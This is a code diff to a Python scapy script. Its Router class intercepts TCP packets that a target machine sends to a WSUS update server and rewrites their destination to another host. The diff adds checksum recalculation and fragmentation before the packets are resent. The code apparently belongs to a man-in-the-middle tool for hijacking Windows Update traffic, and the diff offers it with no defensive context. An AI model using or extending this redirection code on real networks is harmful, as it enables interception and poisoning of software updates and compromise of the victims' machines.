@@ -2,10 +2,8 @@
 # -*- coding: utf-8 -*-
 
 import logging
-import sys
-import time
 import traceback
-from scapy.all import sniff, IP, TCP, get_if_hwaddr
+from scapy.all import sniff, IP, TCP, get_if_hwaddr, fragment
 from scapy.sendrecv import sendp
 from threading import Thread
 
@@ -29,16 +27,18 @@ class Router:
 
     def _process_packet(self, packet):
         if IP in packet and TCP in packet and packet[IP].src == self.targetIp and packet.dst == self.hostMac and packet[IP].dst == self.wsusIp:
-            #print("BEFORE: ")
-            #packet.show()
             self.logger.debug(f"Forwarding packet from {packet[IP].src} to {self.hostIp}")
             packet[IP].dst = self.hostIp  # Ziel-IP-Adresse ändern
-            #print("AFTER: ")
-            #packet.show()
+            del packet[IP].chksum
+            del packet[TCP].chksum
+            packet.show2(dump=True)
+            frags = fragment(packet, fragsize=1000)
             try:
-                sendp(packet, verbose=0, iface=self.interface)  # Paket weiterleiten
+                for frag in frags:
+                    sendp(frag, verbose=0, iface=self.interface)  # Paket weiterleiten
             except Exception as e:
                 self.logger.error(f"Error while forwarding packet: {e}")
+                traceback.print_exc()
 
     def start(self, targetIp, hostIp, wsusIp, interface):
         self.targetIp = targetIp
